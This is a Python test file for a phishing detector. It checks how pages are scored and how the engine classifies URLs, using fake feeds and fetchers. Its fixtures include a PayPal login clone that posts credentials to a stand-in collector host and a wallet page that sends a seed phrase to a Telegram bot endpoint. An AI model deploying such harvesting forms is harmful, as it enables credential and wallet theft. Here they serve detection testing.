"""Page analysis and the engine's network stages, using fakes (no real network)."""
from phishdetect.config import Settings
from phishdetect.engine import Engine
from phishdetect.fetcher import FetchResult
from phishdetect.indicators import THREAT_INTEL, Indicator
from phishdetect.intel import ProviderResult
from phishdetect.page_rules import analyse_page
from phishdetect.urltools import parse_url

LOGIN_CLONE = """<html><head><title>PayPal - Log in to your account</title></head><body>
<form action="https://collector-site-zz.net/save.php" method="post">
<input type="email" name="login_email"><input type="password" name="login_password"><button>Log In</button></form>
</body></html>"""


def page(url, body, chain=None):
    p = parse_url(url)
    fr = FetchResult(ok=True, final_url=p.url, status=200, chain=chain or [(p.url, 200)], content_type="text/html", body=body)
    return {i.id: i for i in analyse_page(p, p, fr)}


def test_brand_login_clone_on_foreign_domain():
    found = page("https://secure-update-zz.com/login", LOGIN_CLONE)
    assert found["page_brand_impersonation"].severity == "high"
    assert found["form_cross_domain"].severity == "high"


def test_same_page_on_the_real_domain_is_clean():
    found = page("https://www.paypal.com/signin", LOGIN_CLONE.replace("https://collector-site-zz.net/save.php", "/signin"))
    assert not [i for i in found.values() if i.weight > 0]


def test_plain_login_on_unknown_site_is_only_weak_evidence():
    found = page("https://small-club-zz.org/login", "<title>Members</title><form><input type=password name=pw></form>")
    assert found["login_form_unverified"].severity == "low"


def test_exfiltration_and_wallet_phrase():
    body = ('<title>Restore wallet</title><form action="https://api.telegram.org/bot123:ABC/sendMessage">'
            '<input name="seed_phrase"><input type="password"></form>')
    found = page("https://wallet-restore-zz.app/", body)
    assert "form_exfiltration" in found and "wallet_phrase_request" in found


def test_content_is_never_trusted_as_html():
    found = page("https://small-club-zz.org/", "<title><script>alert(1)</script></title><p>hi</p>")
    assert all("<script>" not in i.title for i in found.values())


class FakeProvider:
    label = "Fake feed"

    def __init__(self, status, indicators=()):
        self.status, self.indicators = status, list(indicators)

    def configured(self):
        return True

    def lookup(self, p):
        return ProviderResult(self.label, self.status, "test", list(self.indicators))


class FakeAge(FakeProvider):
    label = "Domain registration age (RDAP)"

    def __init__(self, days):
        super().__init__("clean")
        self.days = days

    def lookup(self, p):
        res = ProviderResult(self.label, "clean", f"{self.days} days")
        res.age_days = self.days
        return res


def engine(providers, age, fetch):
    s = Settings.offline()
    s.enable_live_fetch = True
    return Engine(s, providers=providers, age_provider=age, fetch=fetch)


def ok_fetch(body="<html><title>Small club</title><p>Welcome to our club pages.</p></html>", final=None):
    def fetch(url, **kw):
        f = final or url
        chain = [(url, 302), (f, 200)] if final else [(url, 200)]
        return FetchResult(ok=True, final_url=f, status=200, chain=chain, content_type="text/html", body=body)
    return fetch


def test_confirmed_intel_match_wins_even_on_popular_domain():
    hit = Indicator("fake_match", "Listed", "critical", THREAT_INTEL, "listed", "x", group="intel_confirmed")
    r = engine([FakeProvider("match", [hit])], FakeAge(4000), ok_fetch()).analyse("https://www.wikipedia.org/some/page")
    assert r["classification"] == "likely_phishing" and r["risk_score"] >= 97 and r["confidence"]["level"] == "high"


def test_unknown_domain_becomes_likely_safe_only_with_positive_evidence():
    url = "https://some-unknown-site-qq.net/"
    r = engine([FakeProvider("clean")], FakeAge(2000), ok_fetch()).analyse(url)
    assert r["classification"] == "likely_safe"
    # threat feed unreachable + age unknown => no positive evidence
    r = engine([FakeProvider("error")], FakeProvider("error"), ok_fetch()).analyse(url)
    assert r["classification"] == "unable_to_determine"


def test_new_domain_with_login_clone_is_phishing():
    r = engine([FakeProvider("clean")], FakeAge(3), ok_fetch(LOGIN_CLONE)).analyse("https://some-unknown-site-qq.net/login")
    assert r["classification"] == "likely_phishing"
    assert {"page_brand_impersonation", "form_cross_domain"} <= {i["id"] for i in r["indicators"]}


def test_shortener_is_followed_and_destination_judged():
    good = engine([FakeProvider("clean")], FakeAge(3000), ok_fetch(final="https://www.python.org/downloads/")).analyse("https://bit.ly/abc")
    assert good["classification"] == "likely_safe" and good["final_destination"]
    bad = engine([FakeProvider("clean")], FakeAge(3000), ok_fetch(final="http://paypa1-secure-login.xyz/verify")).analyse("https://bit.ly/abc")
    assert bad["classification"] == "likely_phishing"


def test_failed_fetch_is_reported_as_missing_information():
    def fetch(url, **kw):
        return FetchResult(ok=False, error="dns_failure", detail="the host name does not resolve")
    r = engine([FakeProvider("clean")], FakeAge(2000), fetch).analyse("https://some-unknown-site-qq.net/")
    assert r["classification"] == "unable_to_determine"
    assert any("Page retrieval" in m for m in r["missing_information"])


def test_provider_exception_does_not_break_analysis():
    class Boom(FakeProvider):
        def lookup(self, p):
            raise RuntimeError("boom")
    r = engine([Boom("clean")], FakeAge(2000), ok_fetch()).analyse("https://www.wikipedia.org/")
    assert r["classification"] == "likely_safe"
    assert any(c["status"] == "error" for c in r["checks"])


def test_fetcher_crash_does_not_break_analysis():
    def fetch(url, **kw):
        raise AttributeError("'NoneType' object has no attribute 'getpeercert'")
    r = engine([FakeProvider("clean")], FakeAge(2000), fetch).analyse("https://www.roblox.com/")
    assert r["classification"] == "likely_safe"
    assert any(c["status"] == "error" and "Page retrieval" in c["name"] for c in r["checks"])
